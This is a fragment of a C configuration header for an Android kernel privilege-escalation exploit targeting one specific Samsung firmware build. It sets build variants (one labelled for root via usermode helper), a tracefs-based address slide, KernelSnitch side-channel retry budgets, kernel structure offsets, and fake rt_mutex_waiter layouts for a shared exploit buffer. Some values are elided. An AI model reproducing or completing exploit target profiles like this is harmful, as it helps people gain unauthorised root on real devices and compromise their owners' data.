...
#define BUILD_VARIANT_LABEL "a37x-A376BXXU1AZB7-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
#define APP_TRACEFS_SLIDE 1
/* Accept sched_ok as write confirmation (e1s/e2s proven config). Our
   ground-truth fops-probe proved sched_ok==write-landed on this device. */
#define APP_ACCEPT_SCHED_TRIGGER 1
/* e1s-class retry budgets: KernelSnitch stages are probabilistic on this
   SoC; shell-mode runs needed up to 6 prepare attempts before success. */
...
#else
#define BUILD_VARIANT_LABEL "a37x-A376BXXU1AZB7-root-umh"
#endif
...
#define KERNELSNITCH_VERBOSE 1 /* diagnostic build */
/* Real mm_struct size from OUR kernel BTF (0x3c0). The engine default
   (0x500) breaks the KernelSnitch slab scan stride on this SoC. */
...
/* Live value read from /sys/kernel/tracing/events/sched/sched_blocked_reason/id */
#define SLIDE_TRACEFS_EVENT_ID 106
/* worker_thread: return address after the blocking bl schedule */
...
#define P0_FINGERPRINT_HEADER \
  "targets/a37x-A376BXXU1AZB7/p0_fingerprint.h"
#endif
...
/* Exact A376BXXU1AZB7 offsets from vmlinux-to-elf recovery of boot.img. */
...
/* "nfnetlink_log" string referenced by nfulnl_logger.name */
...
/* ctl_table entry "boot_id" .data pointer slot (Samsung uses boot_id). */
...
/* rt_mutex_waiter layout per BTF: tree_entry@0, pi_tree_entry@0x18,
   task@0x30, lock@0x38, wake_state@0x40, prio@0x44, deadline@0x48,
   ww_ctx@0x50. FAKE_* values below follow the shared exploit buffer
   convention used by the 6.1 profiles. */
